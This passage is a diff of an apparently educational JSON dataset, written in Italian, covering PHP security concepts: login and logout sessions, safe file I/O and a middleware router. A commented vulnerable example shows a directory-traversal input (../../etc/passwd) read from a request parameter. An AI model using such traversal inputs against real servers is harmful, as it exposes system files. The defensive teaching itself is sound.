$stmt->execute();\n        $stmt->close();\n    }\n    \n    // Reset rate limiting\n    unset($_SESSION['_rate']['login']);\n    \n    header('Location: /dashboard.php', true, 303);\n    exit;\n}\n\n// ============================================\n// LOGOUT\n// ============================================\n\nsecure_session_start();\n\n// Svuota sessione\n$_SESSION = [];\n\n// Elimina cookie sessione\nif (ini_get('session.use_cookies')) {\n    $params = session_get_cookie_params();\n    setcookie(\n        session_name(),\n        '',\n        time() - 42000,\n        $params['path'],\n        $params['domain'],\n        $params['secure'],\n        $params['httponly']\n    );\n}\n\nsession_destroy();\n\nheader('Location: /login.php?logout=1', true, 303);\nexit;\n?>",
+      "security_notes": [
+        "password_hash() con Argon2id (o bcrypt cost 12) per hashing sicuro",
+        "password_verify() per confronto timing-safe (previene timing attacks)",
+        "Rate limiting OBBLIGATORIO: max 5 tentativi login in 15 minuti",
+        "session_regenerate_id() dopo login (previene session fixation)",
+        "Messaggi errore generici (no information disclosure su username/email)",
+        "Rehash automatico password se algoritmo obsoleto",
+        "Dummy hash per timing-safe verification anche con utente inesistente",
+        "HTTPS obbligatorio (credenziali su HTTP = plaintext sniffing)"
+      ],
+      "common_mistakes": [
+        "Salvare password plaintext (CRITICO: data breach espone tutte password)",
+        "Usare md5/sha1 per hashing (veloce = brute-force facile)",
+        "Non implementare rate limiting (brute-force attacks)",
+        "Information disclosure: 'username non esiste' vs 'password errata'",
+        "Non rigenerare session ID dopo login (session fixation)",
+        "Password deboli accettate (no validazione complessità)",
+        "Non usare password_verify (confronto insicuro, timing attacks)"
+      ],
+      "best_practices": [
+        "2FA/MFA per account sensibili (TOTP, SMS, biometric)",
+        "Password strength meter in UI (zxcvbn library)",
+        "Notifiche login da IP/dispositivo nuovo",
+        "Password reset con token temporizzato (email)",
+        "Account lockout dopo N tentativi falliti",
+        "Audit logging login successo/falliti con IP/timestamp",
+        "Passwordless auth con WebAuthn/FIDO2 (futuro)",
+        "OAuth2/OpenID Connect per social login"
+      ],
+      "learning_objectives": [
+        "Implementare sistema auth completo con password hashing",
+        "Applicare rate limiting per prevenire brute-force",
+        "Configurare sessioni sicure con regeneration ID",
+        "Gestire timing-safe comparisons per sicurezza"
+      ],
+      "related_concepts": [
+        "PHP-SESSION-001",
+        "PHP-MYSQLI-001",
+        "PHP-SECURITY-CSRF-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-FILE-001",
+      "topic": "Gestione File I/O Sicura",
+      "category": "File System",
+      "difficulty_level": "intermediate",
+      "explanation": "Operazioni file in PHP: lettura (file_get_contents, fgets), scrittura (file_put_contents, fwrite), permessi (is_readable, is_writable), locking (flock). Sicurezza: validare path (prevenire directory traversal), usare __DIR__ per path assoluti, LOCK_EX per scritture concorrenti, verificare permessi prima di operazioni, sanitizzare output da file. CSV: fgetcsv/fputcsv con separatore esplicito. Best practice: file sensibili fuori document root, permessi restrittivi (0644 file, 0755 directory).",
+      "code_example": "<?php\n/**\n * FILE I/O SICURO - Lettura, scrittura, locking, CSV\n */\n\n// ============================================\n// SCRITTURA SICURA CON LOCKING\n// ============================================\n\n// Path sicuro con __DIR__ (directory corrente)\n$logFile = __DIR__ . '/logs/app.log';\n\n// Verifica directory esiste\nif (!is_dir(dirname($logFile))) {\n    mkdir(dirname($logFile), 0755, true);\n}\n\n// FILE_APPEND: aggiunge senza sovrascrivere\n// LOCK_EX: lock esclusivo (previene race conditions)\n$timestamp = date('Y-m-d H:i:s');\n$message = \"[$timestamp] Evento importante\\n\";\n\n$bytes = file_put_contents($logFile, $message, FILE_APPEND | LOCK_EX);\n\nif ($bytes === false) {\n    error_log('Scrittura log fallita');\n}\n\n// ============================================\n// LETTURA SICURA CON VALIDAZIONE PATH\n// ============================================\n\nfunction read_file_secure(string $filename): string {\n    // Whitelist directory permesse\n    $allowedDir = __DIR__ . '/data';\n    \n    // Path assoluto real (resolve symlinks)\n    $realPath = realpath($allowedDir . '/' . $filename);\n    \n    if ($realPath === false) {\n        throw new Exception('File non trovato');\n    }\n    \n    // CRITICO: verifica path dentro directory permessa\n    if (!str_starts_with($realPath, $allowedDir)) {\n        // Previene directory traversal: ../../etc/passwd\n        throw new Exception('Path non consentito');\n    }\n    \n    if (!is_readable($realPath)) {\n        throw new Exception('File non leggibile');\n    }\n    \n    $content = file_get_contents($realPath);\n    \n    if ($content === false) {\n        throw new Exception('Lettura fallita');\n    }\n    \n    return $content;\n}\n\n// Uso sicuro\ntry {\n    $data = read_file_secure('config.json');\n    $config = json_decode($data, true);\n} catch (Exception $e) {\n    error_log('Read error: ' . $e->getMessage());\n    exit('Errore lettura file');\n}\n\n// ============================================\n// DIRECTORY TRAVERSAL ATTACK PREVENTION\n// ============================================\n\n/**\n * ESEMPIO VULNERABILE:\n * \n * $file = $_GET['file'];  // Input: ../../etc/passwd\n * $content = file_get_contents('/var/www/uploads/' . $file);\n * // Legge: /var/www/uploads/../../etc/passwd -> /etc/passwd\n * \n * DIFESA:\n * 1. realpath() per risolvere .. e symlinks\n * 2. str_starts_with() per verificare path dentro directory permessa\n * 3. Whitelist estensioni permesse\n */\n\n// ============================================\n// LOCKING ESPLICITO CON FLOCK\n// ============================================\n\nfunction write_counter_atomic(string $file): int {\n    // Apri in modalità c+ (create/read/write)\n    $fp = fopen($file, 'c+');\n    \n    if ($fp === false) {\n        throw new Exception('fopen fallito');\n    }\n    \n    // Lock esclusivo (blocca altri processi)\n    if (!flock($fp, LOCK_EX)) {\n        fclose($fp);\n        throw new Exception('Lock fallito');\n    }\n    \n    // Leggi valore corrente\n    $content = stream_get_contents($fp);\n    $counter = (int)$content;\n    \n    // Incrementa\n    $counter++;\n    \n    // Riscrive da inizio file\n    rewind($fp);\n    ftruncate($fp, 0);\n    fwrite($fp, (string)$counter);\n    fflush($fp);\n    \n    // Rilascia lock\n    flock($fp, LOCK_UN);\n    fclose($fp);\n    \n    return $counter;\n}\n\n// ============================================\n// CSV SICURO\n// ============================================\n\n// Scrittura CSV\nfunction write_csv(string $file, array $rows): void {\n    $fp = fopen($file, 'w');\n    \n    if ($fp === false) {\n        throw new Exception('Apertura CSV fallita');\n    }\n    \n    // Header\n    fputcsv($fp, ['ID', 'Nome', 'Email'], ';');\n    \n    // Dati\n    foreach ($rows as $row) {\n        fputcsv($fp, $row, ';');\n    }\n    \n    fclose($fp);\n}\n\n// Lettura CSV sicura\nfunction read_csv(string $file): array {\n    if (!is_readable($file)) {\n        throw new Exception('CSV non leggibile');\n    }\n    \n    $fp = fopen($file, 'r');\n    \n    if ($fp === false) {\n        throw new Exception('Apertura CSV fallita');\n    }\n    \n    $rows = [];\n    $header = fgetcsv($fp, 0, ';');\n    \n    while (($row = fgetcsv($fp, 0, ';')) !== false) {\n        // Associa header a valori\n        if (count($row) === count($header)) {\n            $rows[] = array_combine($header, $row);\n        }\n    }\n    \n    fclose($fp);\n    return $rows;\n}\n\n// Uso\n$data = [\n    [1, 'Ada Lovelace', 'ada@example.com'],\n    [2, 'Grace Hopper', 'grace@example.com'],\n];\n\nwrite_csv(__DIR__ . '/export.csv', $data);\n$imported = read_csv(__DIR__ . '/export.csv');\n\n// Output sicuro\nforeach ($imported as $row) {\n    echo htmlspecialchars($row['Nome'], ENT_QUOTES, 'UTF-8') . '<br>';\n}\n\n// ============================================\n// PERMESSI FILESYSTEM\n// ============================================\n\n// Verifica permessi prima di operazioni\nfunction check_permissions(string $file): void {\n    if (!file_exists($file)) {\n        throw new Exception('File non esiste');\n    }\n    \n    if (!is_readable($file)) {\n        throw new Exception('File non leggibile');\n    }\n    \n    if (!is_writable($file)) {\n        throw new Exception('File non scrivibile');\n    }\n    \n    // Verifica owner (se possibile)\n    $owner = posix_getpwuid(fileowner($file));\n    error_log('File owner: ' . ($owner['name'] ?? 'unknown'));\n}\n\n// Imposta permessi restrittivi\n$newFile = __DIR__ . '/secure.dat';\nfile_put_contents($newFile, 'data');\nchmod($newFile, 0600);  // Readable/writable solo owner\n\n?>",
+      "security_notes": [
+        "Directory traversal: validare path con realpath() + str_starts_with()",
+        "Whitelist directory permesse, never trust user input per path",
+        "LOCK_EX obbligatorio per scritture concorrenti (race conditions)",
+        "File sensibili fuori document root (/var/app_data, non /var/www/html)",
+        "Permessi filesystem: 0644 file, 0755 directory, 0600 per file sensibili",
+        "Sanitizzare output da file con htmlspecialchars prima di echo",
+        "CSV: separatore esplicito (non default comma, ambiguo con locale)",
+        "Verificare is_readable/is_writable prima di operazioni file"
+      ],
+      "common_mistakes": [
+        "Concatenare input utente in path (directory traversal: ../../etc/passwd)",
+        "Non usare LOCK_EX per scritture concorrenti (file corrotto)",
+        "File sensibili in document root (accessibili via web)",
+        "Permessi troppo permissivi (0777 = security risk)",
+        "Non controllare errori fopen/fwrite (operazioni falliscono silenziosamente)",
+        "Dimenticare fclose() (file descriptor leak)",
+        "CSV senza encoding UTF-8 esplicito (problemi internazionalizzazione)"
+      ],
+      "best_practices": [
+        "Usare __DIR__ per path relativi alla directory script",
+        "Stream context per operazioni file remote (fopen HTTP)",
+        "Rotazione log con dimensione max (logrotate pattern)",
+        "Atomic file operations: write to temp + rename (previene partial writes)",
+        "File hashing (sha256) per integrity verification",
+        "Encryption file sensibili (OpenSSL, Sodium)",
+        "Filesystem abstraction layer (Flysystem) per portabilità cloud"
+      ],
+      "learning_objectives": [
+        "Implementare operazioni file I/O con locking",
+        "Prevenire directory traversal attacks",
+        "Gestire permessi filesystem in modo sicuro",
+        "Processare CSV con encoding corretto"
+      ],
+      "related_concepts": [
+        "PHP-UPLOAD-001",
+        "PHP-SECURITY-FILE-001",
+        "PHP-BASICS-001"
+      ]
+    },
+    {
+      "concept_id": "PHP-ROUTER-001",
+      "topic": "Router Personalizzato con Middleware",
+      "category": "Web Development",
+      "difficulty_level": "advanced",
+      "explanation": "Un router PHP gestisce mapping URL->handler tramite pattern matching. Componenti: Request (incapsula dati HTTP), Response (helper output), Router (dispatcher). Supporta parametri dinamici (/user/:id), middleware chain (rate limiting, auth, logging), metodi HTTP (GET, POST, PUT, DELETE). Pattern matching: split path in segmenti, confronto con placeholder :param. Middleware: funzioni (Request, Response, next) eseguite in sequenza. esempi/router.php implementa router didattico senza dipendenze esterne.",
+      "code_example": "<?php\n/**\n * ROUTER PERSONALIZZATO - esempi/router.php\n * Pattern matching, middleware, rate limiting\n */\n\n// ============================================\n// REQUEST CLASS\n// ============================================\n\nclass Request {\n    public string $method;\n    public string $path;\n    public array $query = [];\n    public array $post = [];\n    public array $params = [];  // Parametri route\n    \n    public static function fromGlobals(): Request {\n        $r = new self();\n        $r->method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');\n        $r->path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?? '/';\n        $r->query = $_GET ?? [];\n        $r->post = $_POST ?? [];\n        return $r;\n    }\n    \n    public function isPost(): bool {\n        return $this->method == 'POST';\n    }\n    \n    public function getParam(string $name): ?string {\n        return $this->params[$name] ?? null;\n    }\n}\n\n// ============================================\n// RESPONSE CLASS\n// ============================================\n\nclass Response {\n    public function status(int $code): void {\n        $proto = $_SERVER['SERVER_PROTOCOL'] ?? 'HTTP/1.1';\n        header($proto . ' ' . $code, true, $code);\n    }\n    \n    public function header(string $name, string $value): void {\n        header($name . ': ' . $value);\n    }\n    \n    public function json($data, int $code = 200): void {\n        $this->status($code);\n        $this->header('Content-Type', 'application/json');\n        echo json_encode($data, JSON_UNESCAPED_UNICODE);\n    }\n    \n    public function html(string $html, int $code = 200): void {\n        $this->status($code);\n        $this->header('Content-Type', 'text/html; charset=utf-8');\n        echo $html;\n    }\n}\n\n// ============================================\n// ROUTER CLASS\n// ============================================\n\nclass Router {\n    private array $routes = [];\n    private array $middlewares = [];\n    \n    public function add(string $method, string $pattern, callable $handler): void {\n        $m = strtoupper($method);\n        $this->routes[$m] ??= [];\n        $this->routes[$m][] = ['pattern' => $pattern, 'handler' => $handler];\n    }\n    \n    public function use(callable $middleware): void {\n        $this->middlewares[] = $middleware;\n    }\n    \n    public function run(Request $req, Response $res): void {\n        $index = 0;\n        $chain = function() use (&$index, $req, $res, &$chain) {\n            // Middleware chain esaurita: dispatch route\n            if ($index >= count($this->middlewares)) {\n                $this->dispatch($req, $res);\n                return;\n            }\n            $mw = $this->middlewares[$index++];\n            $mw($req, $res, $chain);\n        };\n        \n        try {\n            $chain();\n        } catch (Throwable $e) {\n            error_log('Router error: ' . $e->getMessage());\n            $res->json(['error' => 'Errore interno'], 500);\n        }\n    }\n    \n    private function dispatch(Request $req, Response $res): void {\n        $methodRoutes = $this->routes[$req->method] ?? [];\n        \n        foreach ($methodRoutes as $r) {\n            $params = $this->match($r['pattern'], $req->path);\n            if ($params !== null) {\n                $req->params = $params;\n                $handler = $r['handler'];\n                $handler($req, $res);\n                return;\n            }\n        }\n        \n        // 404 Not Found\n        $res->json(['error' => 'Route non trovata'], 404);\n    }\n    \n    /**\n     * Pattern matching: /user/:id combacia con /user/123\n     */\n    private function match(string $pattern, string $path): ?array {\n        $pp = trim($pattern, '/');\n        $sp = trim($path, '/');\n        $pSeg = $pp == '' ? [] : explode('/', $pp);\n        $sSeg = $sp == '' ? [] : explode('/', $sp);\n        \n        if (count($pSeg) != count($sSeg)) {\n            return null;\n        }\n        \n        $params = [];\n        foreach ($pSeg as $i => $seg) {\n            if (strlen($seg) > 1 && $seg[0] == ':') {\n                // Parametro dinamico\n                $params[substr($seg, 1)] = $sSeg[$i];\n                continue;\n            }\n            if ($seg != $sSeg[$i]) {\n                return null;\n            }\n        }\n        \n        return $params;\n    }\n}\n\n// ============================================\n// MIDDLEWARE: RATE LIMITING\n// ============================================\n\n$rateLimitMiddleware = function(Request $req, Response $res, callable $next): void {\n    static $bucket = [];\n    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';\n    $now = time();\n    $window = (int)floor($now / 60);  // Finestra 1 minuto\n    $key = $ip . ':' . $window;\n    \n    $bucket[$key] = ($bucket[$key] ?? 0) + 1;\n    \n    $limit = 120;  // Max 120 req/min per IP\n    if ($bucket[$key] > $limit) {\n        $res->json(['error' => 'Rate limit superato'], 429);\n        return;\n    }\n    \n    $next();  // Prosegui chain\n};\n\n// ============================================\n// ROUTER SETUP E ROUTES\n// ============================================\n\n$router = new Router();\n$router->use($rateLimitMiddleware);\n\n// Home: elenco routes\n$router->add('GET', '/', function(Request $req, Response $res) {\n    $res->json([\n        'routes' => [\n            'GET /',\n            'GET /user/:id',\n            'POST /api/users',\n            'GET /saluto',\n        ]\n    ]);\n});\n\n// Parametri dinamici\n$router->add('GET', '/user/:id', function(Request $req, Response $res) {\n    $userId = $req->getParam('id');\n    \n    // Validazione parametro\n    if (!ctype_digit($userId)) {\n        $res->json(['error' => 'ID utente invalido'], 400);\n        return;\n    }\n    \n    // Simula fetch da DB\n    $res->json([\n        'user_id' => (int)$userId,\n        'username' => 'user_' . $userId,\n    ]);\n});\n\n// POST endpoint\n$router->add('POST', '/api/users', function(Request $req, Response $res) {\n    $name = $req->post['name'] ?? '';\n    $email = $req->post['email'] ?? '';\n    \n    // Validazione\n    if ($name === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {\n        $res->json(['error' => 'Dati non validi'], 422);\n        return;\n    }\n    \n    // Simula insert DB\n    $res->json([\n        'status' => 'created',\n        'id' => rand(1000, 9999),\n    ], 201);\n});\n\n// Saluto semplice\n$router->add('GET', '/saluto', function(Request $req, Response $res) {\n    $res->html('<h1>Ciao dal router!</h1>');\n});\n\n// ============================================\n// RUN\n// ============================================\n\n$req = Request::fromGlobals();\n$res = new Response();\n$router->run($req, $res);\n?>",
+      "security_notes": [
+        "Rate limiting obbligatorio per endpoint pubblici (120 req/min baseline)",
+        "Validare parametri route (:id) con ctype_digit o regex",
+        "Sanitizzare output con htmlspecialchars per risposte HTML",
+        "Gestione errori centralizzata con try/catch nel dispatcher",
+        "HTTP status codes semantici: 404, 400, 422, 429, 500",
+        "Pattern matching case-sensitive per sicurezza",
+        "Middleware auth per proteggere route sensibili",
+        "Loggare richieste con rate limit exceeded"
+      ],
+      "common_mistakes": [
+        "Non validare parametri dinamici (SQL injection se usati in query)",
+        "Rate limiting assente (DoS attacks facili)",
+        "Middleware order: auth deve essere prima di business logic",
+        "Pattern matching ambiguo (/user/:id vs /user/profile)",
+        "Non gestire eccezioni nel dispatcher (errori 500 non catchati)",
+        "Dimenticare Content-Type header (browser interpreta male risposta)",
+        "Path traversal in pattern matching (validare caratteri permessi)"
+      ],
+      "best_practices": [
+        "Framework routing (Slim, Lumen, Symfony) per produzione",
+        "OpenAPI/Swagger per documentazione API",
+        "CORS middleware per API pubbliche",
+        "Versioning API: /v1/users, /v2/users",
+        "Pagination per collection endpoints (limit/offset)",
+        "ETags per HTTP caching",
+        "Request ID per tracing distribuito",
+        "Metrics: Prometheus endpoint per monitoring"
+      ],
+      "learning_objectives": [
+        "Implementare router con pattern matching",
+        "Gestire middleware chain con callable",
+        "Applicare rate limiting per DoS prevention",
+        "Strutturare API RESTful con HTTP semantics"
+      ],
+      "related_concepts": [
+        "PHP-FORMS-001",
+        "PHP-MYSQLI-001",
+        "PHP-AUTH-001"
+      ]
+    }
+  ],
+  "theoretical_explanations": {
+    "web_security_fundamentals": {
+      "explanation": "La sicurezza web in PHP si basa su principi fondamentali: validazione input (never trust user input), sanitizzazione output (encode per contesto), least privilege (permessi minimi), defense in depth (multiple layers), fail securely (errori non espongono dettagli). Ogni livello applicazione ha vulnerabilità specifiche: input (injection), session (fixation), output (XSS), storage (insecure config).",
+      "owasp_top_10_coverage": [
+        "A01:2021 Broken Access Control - Sessioni sicure, auth, CSRF token",
+        "A02:2021 Cryptographic Failures - password_hash Argon2id/bcrypt, HTTPS",
+        "A03:2021 Injection - Prepared statements MySQLi, htmlspecialchars output",
+        "A04:2021 Insecure Design - PRG pattern, rate limiting, timeout sessioni",
+        "A05:2021 Security Misconfiguration - Cookie flags, permessi filesystem",
+        "A06:2021 Vulnerable Components - PHP 8.1+, dipendenze aggiornate",
+        "A07:2021 Identification/Auth Failures - Password hashing, session regeneration",
+        "A08:2021 Software/Data Integrity - MIME validation upload, finfo_file",
+        "A09:2021 Logging Failures - error_log, audit trail login/logout",
+        "A10:2021 SSRF - Validazione URL, whitelist domini permessi"
+      ],
+      "php_specific_risks": [
+        "Type juggling con == (mitigato da convenzione corso: normalizzazione tipi)",
+        "Superglobali non filtrate ($_GET, $_POST, $_COOKIE)",
+        "include/require con path controllato da utente (RFI/LFI)",
+        "extract() su dati utente (variable injection)",
+        "eval(), create_function() su input (RCE)",
+        "Deserialization non sicura (unserialize dati untrusted)",
+        "Weak randomness (mt_rand vs random_bytes)",
+        "Error disclosure in produzione (display_errors=Off)"
+      ],
+      "mitigation_strategies": [
+        "Input validation: whitelist approach con filter_var/regex",
+        "Output encoding: htmlspecialchars per HTML, json_encode per JSON",
+        "Prepared statements: sempre per DB queries, mai concatenazione",
+        "Secure sessions: httponly, secure, samesite=Strict, regenerate ID",
+        "HTTPS only: HSTS header, secure cookie flag",
+        "CSP: Content-Security-Policy header con nonce",
+        "File upload: MIME validation con finfo_file, path randomization",
+        "Rate limiting: per IP/sessione su login, API, upload",
+        "Logging: error_log per errori, audit trail per azioni sensibili",
+        "Updates: PHP, dependencies, OS patches regolari"
+      ]
+    },
+    "psr12_compliance": {
+      "explanation": "Il corso segue PSR-12 (PHP Standards Recommendations) per consistenza codice: indentazione 4 spazi, camelCase per metodi, PascalCase per classi, operatori spaziati, parentesi graffe su nuova linea per classi/funzioni. Eccezioni: no declare(strict_types=1) per compatibilità esempi didattici, preferenza == su === con tipi normalizzati.",
+      "conventions": [
+        "Indentazione: 4 spazi (no tabs)",
+        "Line length: max 120 caratteri",
+        "Naming: camelCase variabili/metodi, PascalCase classi",
+        "Braces: stessa riga per controlli (if/for), nuova per funzioni",
+        "Operators: spazio prima/dopo (es. $a = $b + $c)",
+        "Comments: italiano per spiegazioni didattiche",
+        "Type hints: quando utili per chiarezza (non strict_types)",
+        "Operators: == default, === con commento esplicativo"
+      ]
+    }
+  }
+}
